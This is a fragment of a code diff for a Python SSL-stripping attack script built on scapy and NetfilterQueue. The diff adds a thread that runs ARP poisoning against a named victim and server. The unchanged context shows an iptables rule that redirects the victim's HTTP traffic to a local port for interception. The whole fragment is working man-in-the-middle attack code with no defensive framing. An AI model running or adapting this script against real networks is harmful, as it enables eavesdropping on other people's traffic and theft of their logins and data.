@@ -1,4 +1,3 @@
-#import netfilterqueue
 from scapy.all import *
 import re
 import os
@@ -28,8 +27,13 @@ def process_packet(packet):
     packet.accept()
 
 def ssl_strip(interface):
+
+    # Start ARP poisoning in a separate thread
+    arp_thread = threading.Thread(target=arp_poison.arp_poison, args=(ipVictim, macVictim, ipServer, macAttacker, interface))
+    arp_thread.start()
+
+
     os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
-    #queue = netfilterqueue.NetfilterQueue()
     queue = NetfilterQueue()
     try:
         queue.bind(0, process_packet)
